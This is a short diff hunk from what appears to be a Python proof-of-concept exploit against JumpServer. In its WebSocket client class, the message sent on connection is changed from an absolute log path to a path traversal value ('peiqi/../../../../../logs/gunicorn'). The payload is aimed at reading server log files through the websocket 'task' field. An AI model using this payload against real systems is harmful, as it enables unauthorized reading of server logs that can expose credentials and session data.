@@ -248,7 +248,7 @@ def title():
 class ws_long(WebSocketClient):
 
     def opened(self):
-        req = '{"task":"/opt/jumpserver/logs/jumpserver"}'
+        req = '{"task":"peiqi/../../../../../logs/gunicorn"}'
         self.send(req)
 
     def closed(self, code, reason=None):
